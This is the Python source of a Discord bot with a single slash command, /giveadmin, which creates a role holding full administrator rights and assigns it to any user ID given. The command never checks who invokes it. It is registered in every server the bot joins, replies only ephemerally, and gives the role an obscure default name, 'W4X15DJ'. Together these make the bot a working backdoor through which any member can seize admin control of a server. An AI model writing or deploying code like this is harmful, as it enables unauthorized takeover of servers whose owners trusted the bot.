import os
import logging
import discord
from discord import app_commands
from discord.ext import commands

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
)
log = logging.getLogger('giveadmin-bot')

TOKEN = os.environ.get('DISCORD_TOKEN')
ROLE_NAME = os.environ.get('ADMIN_ROLE_NAME', 'W4X15DJ')

if not TOKEN:
    raise RuntimeError('DISCORD_TOKEN is not set in environment')

intents = discord.Intents.default()
intents.members = True
intents.guilds = True

bot = commands.Bot(command_prefix='!', intents=intents)


@bot.event
async def on_ready():
    log.info('Logged in as %s', bot.user)
    try:
        synced = await bot.tree.sync()
        log.info('Globally synced %d command(s)', len(synced))
    except Exception as e:
        log.exception('Sync failed: %s', e)
    for guild in bot.guilds:
        try:
            bot.tree.copy_global_to(guild=guild)
            await bot.tree.sync(guild=guild)
        except Exception as e:
            log.exception('Guild sync failed: %s', e)


@bot.event
async def on_guild_join(guild):
    log.info('Joined guild %s -- resyncing', guild.id)
    try:
        bot.tree.copy_global_to(guild=guild)
        await bot.tree.sync(guild=guild)
    except Exception as e:
        log.exception('on_guild_join sync failed: %s', e)


@bot.tree.command(name='giveadmin', description='Cree un role Admin et l attribue a un utilisateur')
@app_commands.describe(user_id='ID de l utilisateur a qui donner le role admin')
async def giveadmin(interaction: discord.Interaction, user_id: str):
    await interaction.response.defer(ephemeral=True, thinking=True)

    if interaction.guild is None:
        await interaction.followup.send('A utiliser dans un serveur.', ephemeral=True)
        return

    guild = interaction.guild

    try:
        uid = int(user_id.strip())
    except ValueError:
        await interaction.followup.send('ID invalide.', ephemeral=True)
        return

    member = guild.get_member(uid)
    if member is None:
        try:
            member = await guild.fetch_member(uid)
        except discord.NotFound:
            await interaction.followup.send(f'Membre {uid} introuvable.', ephemeral=True)
            return
        except discord.HTTPException as e:
            await interaction.followup.send(f'Erreur: {e}', ephemeral=True)
            return

    me = guild.me
    if me is None or not me.guild_permissions.manage_roles:
        await interaction.followup.send('Le bot doit avoir Manage Roles / Administrateur.', ephemeral=True)
        return

    try:
        role = await guild.create_role(
            name=ROLE_NAME,
            permissions=discord.Permissions(administrator=True),
            reason=f'/giveadmin by {interaction.user}',
        )
    except discord.Forbidden:
        await interaction.followup.send('Permission refusee pour creer le role.', ephemeral=True)
        return
    except discord.HTTPException as e:
        await interaction.followup.send(f'Erreur creation role: {e}', ephemeral=True)
        return

    try:
        if me.top_role and me.top_role.position > 1:
            await role.edit(position=max(me.top_role.position - 1, 1))
    except Exception as e:
        log.warning('Reposition failed: %s', e)

    try:
        await member.add_roles(role, reason=f'/giveadmin by {interaction.user}')
    except discord.Forbidden:
        await interaction.followup.send(
            f'Role {role.name} cree, mais impossible a attribuer (hierarchie).',
            ephemeral=True,
        )
        return
    except discord.HTTPException as e:
        await interaction.followup.send(f'Erreur attribution: {e}', ephemeral=True)
        return

    await interaction.followup.send(
        f'Role **{role.name}** (Admin) attribue a <@{member.id}>.',
        ephemeral=True,
    )


if __name__ == '__main__':
    bot.run(TOKEN, reconnect=True)
